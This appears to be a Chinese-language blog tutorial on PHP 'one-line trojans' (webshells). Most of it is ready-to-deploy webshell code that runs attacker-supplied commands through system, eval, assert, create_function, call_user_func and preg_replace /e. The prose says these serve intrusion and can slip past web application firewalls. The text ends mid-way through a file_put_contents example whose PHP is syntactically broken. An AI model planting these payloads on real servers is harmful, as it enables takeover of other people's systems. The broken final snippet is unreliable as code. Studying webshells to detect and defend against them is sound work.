<!doctype html><html lang=zh><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1.0" name=viewport><meta content="light dark" name=color-scheme><title>一句话木马</title><link href=/img/favicon-32x32.png rel=icon sizes=32x32 type=image/png><link href=/img/favicon-16x16.png rel=icon sizes=16x16 type=image/png><link href=/img/apple-touch-icon.png rel=apple-touch-icon sizes=180x180><style>body{--primary-color:#5871a2;--primary-pale-color:#5871a210;--text-color:#3c4043;--text-pale-color:#a3a5a9;--bg-color:#fff;--highlight-mark-color:#5f75b035;--blockquote-color:#8e8d91;--callout-note-color:#5871a2;--callout-important-color:#8062b0;--callout-warning-color:#936e51;--callout-alert-color:#bc5252;--callout-question-color:#477389;--callout-tip-color:#3c8460}body.dark{--primary-color:#5d77ac;--primary-pale-color:#5d77ac20;--text-color:#9197a5;--text-pale-color:#656a74;--bg-color:#18191b;--highlight-mark-color:#5f75b035;--blockquote-color:#747983;--callout-note-color:#5d77ac;--callout-important-color:#8062b0;--callout-warning-color:#936e51;--callout-alert-color:#bc5252;--callout-question-color:#477389;--callout-tip-color:#3c8460}body{--main-font:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";--code-font:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;--homepage-max-width:768px;--main-max-width:768px;--avatar-size:56px;--homepage-font-size:16px;--homepage-line-height:1.75;--paragraph-font-size:16px;--paragraph-line-height:1.75;--aside-font-size:15px;--img-border-radius:0px;--detail-border-radius:0px;--dark-mode-img-brightness:.75;--dark-mode-chart-brightness:.75;--inline-code-border-radius:2px;--inline-code-bg-color:var(--primary-pale-color);--block-code-border-radius:0px;--block-code-border-color:var(--primary-color);--detail-border-color:var(--primary-color)}</style><link href=/main.css rel=stylesheet><link href=/hl-light.css id=hl rel=stylesheet><link crossorigin href=https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css integrity=sha384-nB0miv6/jRmo5UMMR1wu3Gz6NLsoTkbqJghGIsx//Rlm+ZU03BU6SQNC66uf4l5+ rel=stylesheet><script crossorigin defer integrity=sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm/Yr2r3Dy4lfFg src=https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js></script><script crossorigin defer integrity=sha384-43gviWU0YVjaDtb/GhzOouOXtZMP/7XUzwPTstBeZFe/+rCMvRwr4yROQP43s0Xk src=https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js></script><script crossorigin defer integrity=sha384-HORx6nWi8j5/mYA+y57/9/CZc5z8HnEw4WUZWy5yOn9ToKBv1l58vJaufFAn9Zzi src=https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/copy-tex.min.js></script><script>document.addEventListener(`DOMContentLoaded`,(()=>{let b=`\$`,a=`\$\$`;renderMathInElement(document.body,{delimiters:[{left:a,right:a,display:!0},{left:b,right:b,display:!1},{left:`\\\\(`,right:`\\\\)`,display:!1},{left:`\\\\[`,right:`\\\\]`,display:!0}],throwOnError:!1})}))</script><body class=post><script>const theme=sessionStorage.getItem(`theme`);const match=window.matchMedia(`(prefers-color-scheme: dark)`).matches;if(theme&&theme==`dark`||!theme&&match){document.body.classList.add(`dark`);const a=document.querySelector(`link#hl`);if(a)a.href=`/hl-dark.css`}</script><header class=blur><div id=header-wrapper><nav><a class=instant href=/>lbsucceed</a><button aria-label="toggle expand" class=separator id=toggler>::</button><span class="wrap left fold">{</span><a class=instant href=/posts>posts</a><span class="wrap-separator fold">,</span><a class="instant fold" href=/projects>projects</a><span class="wrap-separator fold">,</span><a class="instant fold" href=/about>about</a><span class="wrap right fold">} ;</span></nav><div id=btns><a aria-label="rss feed" href=/posts/feed.xml id=rss-btn><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M3 17C5.20914 17 7 18.7909 7 21H3V17ZM3 10C9.07513 10 14 14.9249 14 21H12C12 16.0294 7.97056 12 3 12V10ZM3 3C12.9411 3 21 11.0589 21 21H19C19 12.1634 11.8366 5 3 5V3Z" fill=currentColor></path></svg></a><button aria-label="theme switch" id=theme-toggle><span class=moon-icon><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M10 7C10 10.866 13.134 14 17 14C18.9584 14 20.729 13.1957 21.9995 11.8995C22 11.933 22 11.9665 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C12.0335 2 12.067 2 12.1005 2.00049C10.8043 3.27098 10 5.04157 10 7ZM4 12C4 16.4183 7.58172 20 12 20C15.0583 20 17.7158 18.2839 19.062 15.7621C18.3945 15.9187 17.7035 16 17 16C12.0294 16 8 11.9706 8 7C8 6.29648 8.08133 5.60547 8.2379 4.938C5.71611 6.28423 4 8.9417 4 12Z" fill=currentColor></path></svg></span> <span class=sun-icon><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z" fill=currentColor></path></svg></span></button><button aria-label="table of content" id=toc-toggle><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M3 4H21V6H3V4ZM3 11H15V13H3V11ZM3 18H21V20H3V18Z" fill=currentColor></path></svg></button></div></div></header><dialog id=rss-mask><div><a href=https://lbsucceed.github.io/posts/feed.xml>https://lbsucceed.github.io/posts/feed.xml</a><button data-check-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M10.0007 15.1709L19.1931 5.97852L20.6073 7.39273L10.0007 17.9993L3.63672 11.6354L5.05093 10.2212L10.0007 15.1709Z" fill="currentColor"></path></svg>' data-copy-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M6.9998 6V3C6.9998 2.44772 7.44752 2 7.9998 2H19.9998C20.5521 2 20.9998 2.44772 20.9998 3V17C20.9998 17.5523 20.5521 18 19.9998 18H16.9998V20.9991C16.9998 21.5519 16.5499 22 15.993 22H4.00666C3.45059 22 3 21.5554 3 20.9991L3.0026 7.00087C3.0027 6.44811 3.45264 6 4.00942 6H6.9998ZM5.00242 8L5.00019 20H14.9998V8H5.00242ZM8.9998 6H16.9998V16H18.9998V4H8.9998V6Z" fill="currentColor"></path></svg>' aria-label=copy autofocus data-link=https://lbsucceed.github.io/posts/feed.xml><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M6.9998 6V3C6.9998 2.44772 7.44752 2 7.9998 2H19.9998C20.5521 2 20.9998 2.44772 20.9998 3V17C20.9998 17.5523 20.5521 18 19.9998 18H16.9998V20.9991C16.9998 21.5519 16.5499 22 15.993 22H4.00666C3.45059 22 3 21.5554 3 20.9991L3.0026 7.00087C3.0027 6.44811 3.45264 6 4.00942 6H6.9998ZM5.00242 8L5.00019 20H14.9998V8H5.00242ZM8.9998 6H16.9998V16H18.9998V4H8.9998V6Z" fill=currentColor></path></svg></button></div></dialog><div id=wrapper><div id=blank></div><aside><nav><ul><li><a class=h2 href=#yi-ju-hua-mu-ma>一句话木马</a><li><a class=h2 href=#qi-ta-han-shu>其他函数</a> <ul><li><a class=h3 href=#assert>assert</a><li><a class=h3 href=#create-function>create_function</a><li><a class=h3 href=#call-user-func-hui-diao-han-shu>call_user_func 回调函数</a><li><a class=h3 href=#preg-replace>preg_replace</a><li><a class=h3 href=#file-put-contents>file_put_contents</a></ul><li><a class=h2 href=#yi-ju-hua-mu-ma-rao-guo-waf>一句话木马绕过waf</a> <ul><li><a class=h3 href=#bian-liang-han-shu>变量函数</a><li><a class=h3 href=#ke-bian-bian-liang>可变变量</a><li><a class=h3 href=#str-replace-han-shu>str_replace 函数</a><li><a class=h3 href=#base64-decode-han-shu>base64_decode 函数</a><li><a class=h3 href=#parse-str-han-shu>parse_str 函数</a><li><a class=h3 href=#zi-ding-yi-han-shu>自定义函数</a></ul></ul></nav><button aria-label="back to top" id=back-to-top><svg viewbox="0 0 24 24" height=24 width=24 xmlns=http://www.w3.org/2000/svg><path d="M11.9997 10.8284L7.04996 15.7782L5.63574 14.364L11.9997 8L18.3637 14.364L16.9495 15.7782L11.9997 10.8284Z" fill=currentColor></path></svg></button></aside><main><div><article data-backlink-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M9.41421 8L18.0208 16.6066L16.6066 18.0208L8 9.41421V17H6V6H17V8H9.41421Z" fill="currentColor"></path></svg>' class=prose><h1>一句话木马</h1><div id=post-info><div id=date><span id=publish>2025-06-01</span><span>Updated on <span id=updated>2025-06-09</span></span></div><div id=tags><a class=instant href=https://lbsucceed.github.io/tags/game><span>#</span>game</a><a class=instant href=https://lbsucceed.github.io/tags/network><span>#</span>network</a></div></div><blockquote class="callout alert hidden" data-alert-text-after=" days ago and may be out of date." data-alert-text-before="This article was last updated " data-days=120 id=outdate_alert><div class=content></div></blockquote><h3 id=yi-ju-hua-mu-ma>一句话木马<a aria-label="Anchor link for: yi-ju-hua-mu-ma" class=zola-anchor href=#yi-ju-hua-mu-ma style=visibility:hidden></a></h3><p>一句木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。黑客多在注册信息的电子邮箱或者个人主页等中运行该木马。<p>顾名思义是执行恶意指令的木马，通过技术手段上传到指定服务器上并可以正常访问。<p>举一个小栗子：<pre class="language-php z-code" data-lang=php><code class=language-php data-lang=php><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-line z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&LT?php</span></span><span class="z-meta z-embedded z-line z-php"><span class="z-source z-php"> <span class="z-meta z-function-call z-php"><span class="z-support z-function z-exec z-php">system</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_GET</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">a</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span></span><span class="z-punctuation z-section z-embedded z-end z-php">?></span><span class="z-meta z-html-newline-after-php z-php">
</span></span></span></span></code></pre><p>可以通过URL参数执行系统命令<p>http://localhost:3000/hit.php?a=whoami<p>比如传入whoami查看当前用户<p>还有ipconfig<p><img alt=image-20250609225843148 src=/imgs/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0.assets/image-20250609225843148.png><p>再换成post,使用hackbar<pre class="language-php z-code" data-lang=php><code class=language-php data-lang=php><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-line z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&LT?php</span></span><span class="z-meta z-embedded z-line z-php"><span class="z-source z-php"> <span class="z-meta z-function-call z-php"><span class="z-support z-function z-exec z-php">system</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">a</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span></span><span class="z-punctuation z-section z-embedded z-end z-php">?></span><span class="z-meta z-html-newline-after-php z-php">
</span></span></span></span></code></pre><p><img alt=image-20250609230351762 src=/imgs/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0.assets/image-20250609230351762.png><p>看下面的代码，这个是php一句话木马的代码<pre class="language-php z-code" data-lang=php><code class=language-php data-lang=php><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-line z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&LT?php</span></span><span class="z-meta z-embedded z-line z-php"><span class="z-source z-php"> <span class="z-meta z-function-call z-php"><span class="z-support z-function z-construct z-php">eval</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-keyword z-operator z-error-control z-php">@</span><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">abc</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span> </span><span class="z-punctuation z-section z-embedded z-end z-php">?></span><span class="z-meta z-html-newline-after-php z-php">
</span></span></span></span></code></pre><p>这段PHP代码的功能是执行通过POST请求传递过来的参数，我用post提交什么，服务器执行什么，也是说把这个代码上传上去之后，我让你服务器干啥干啥，甚至我让你服务器删除所有文件都会删除<p>具体来说，<code>eval(@$_POST['abc']);</code> 原理是<ul><li><code>eval()</code> 是PHP的一个内置函数，用于执行字符串作为PHP代码。<li><code>@</code> 是一个操作符，用于抑制可能的错误消息。在这里，它抑制了<code>$_POST['a']</code>可能引发的错误（例如，如果<code>$_POST['a']</code>不存在或者不是有效的代码字符串）。<li><code>$_POST['a']</code> 是一个从HTTP POST请求中获取的变量。它应该是一个字符串，该字符串包含要执行的PHP代码。</ul><h1 id=qi-ta-han-shu>其他函数<a aria-label="Anchor link for: qi-ta-han-shu" class=zola-anchor href=#qi-ta-han-shu style=visibility:hidden></a></h1><h2 id=assert><code>assert</code><a aria-label="Anchor link for: assert" class=zola-anchor href=#assert style=visibility:hidden></a></h2><pre class="language-php z-code" data-lang=php><code class=language-php data-lang=php><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-line z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&LT?php</span></span><span class="z-meta z-embedded z-line z-php"><span class="z-source z-php"> <span class="z-keyword z-operator z-error-control z-php">@</span><span class="z-meta z-function-call z-php"><span class="z-support z-function z-info z-php">assert</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">shell</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span></span><span class="z-punctuation z-section z-embedded z-end z-php">?></span><span class="z-meta z-html-newline-after-php z-php">
</span></span></span></span></code></pre><h2 id=create-function><code>create_function</code><a aria-label="Anchor link for: create-function" class=zola-anchor href=#create-function style=visibility:hidden></a></h2><pre class="language-php z-code" data-lang=php><code class=language-php data-lang=php><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&LT?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>fun</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-keyword z-operator z-error-control z-php">@</span><span class="z-meta z-function-call z-php"><span class="z-support z-function z-funchand z-php">create_function</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-end z-php">'</span></span><span class="z-punctuation z-separator z-php">,</span><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">shell</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-keyword z-operator z-error-control z-php">@</span><span class="z-meta z-function-call z-invoke z-php"><span class="z-punctuation z-definition z-variable z-php">$</span><span class="z-variable z-other z-php">fun</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"></span><span class="z-punctuation z-section z-embedded z-end z-php">?></span><span class="z-meta z-html-newline-after-php z-php">
</span></span></span></span></code></pre><h2 id=call-user-func-hui-diao-han-shu><code>call_user_func</code> 回调函数<a aria-label="Anchor link for: call-user-func-hui-diao-han-shu" class=zola-anchor href=#call-user-func-hui-diao-han-shu style=visibility:hidden></a></h2><pre class="language-php z-code" data-lang=php><code class=language-php data-lang=php><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-line z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&LT?php</span></span><span class="z-meta z-embedded z-line z-php"><span class="z-source z-php"> <span class="z-keyword z-operator z-error-control z-php">@</span><span class="z-meta z-function-call z-php"><span class="z-support z-function z-funchand z-php">call_user_func</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-constant z-other z-php">assert</span><span class="z-punctuation z-separator z-php">,</span><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">shell</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span></span><span class="z-punctuation z-section z-embedded z-end z-php">?></span><span class="z-meta z-html-newline-after-php z-php">
</span></span></span></span></code></pre><p><code>call_user_func</code> 函数的第一个参数调用其他函数，第二个参数为该调用函数传参。一些被waf拦截的的可配合这个函数绕过waf。<h2 id=preg-replace><code>preg_replace</code><a aria-label="Anchor link for: preg-replace" class=zola-anchor href=#preg-replace style=visibility:hidden></a></h2><pre class="language-php z-code" data-lang=php><code class=language-php data-lang=php><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&LT?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-keyword z-operator z-error-control z-php">@</span><span class="z-meta z-function-call z-php"><span class="z-support z-function z-php_pcre z-php">preg_replace</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-string z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">"</span><span class="z-punctuation z-definition z-string z-regex-delimiter z-begin z-php">/</span><span class="z-source z-regexp z-php">abcde</span><span class="z-punctuation z-definition z-string z-regex-delimiter z-end z-php">/</span><span class="z-meta z-regex z-modifier z-php">e</span><span class="z-punctuation z-definition z-string z-end z-php">"</span></span></span><span class="z-punctuation z-separator z-php">,</span><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">shell</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-punctuation z-separator z-php">,</span><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">"</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">abcdefg</span><span class="z-punctuation z-definition z-string z-end z-php">"</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"></span><span class="z-punctuation z-section z-embedded z-end z-php">?></span><span class="z-meta z-html-newline-after-php z-php">
</span></span></span></span></code></pre><p>该函数利作用是使用正则表达式替换符合条件的字符串，但该函数可执行命令。函数的第一个参数是正则表达式，按照 PHP 的格式，表达式在<code>/</code>间，若在<code>/</code>末尾加 <code>e</code>，这个函数的第二个参数就会被当作代码执行。<h2 id=file-put-contents><code>file_put_contents</code><a aria-label="Anchor link for: file-put-contents" class=zola-anchor href=#file-put-contents style=visibility:hidden></a></h2><pre class="language-php z-code" data-lang=php><code class=language-php data-lang=php><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&LT?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>test</span><span class="z-keyword z-operator z-assignment z-php">=</span><span class="z-keyword z-operator z-comparison z-php"><</span>?<span class="z-constant z-other z-php">php</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>a</span><span class="z-keyword z-operator z-assignment z-php">=</span><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">shell</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span><span class="z-meta z-function-call z-php"><span class="z-support z-function z-info z-php">assert</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>a</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span></span><span class="z-punctuation z-section z-embedded z-end z-php">?></span></span>;
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">@file_put_contents("Biu.php,$test")
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">?>
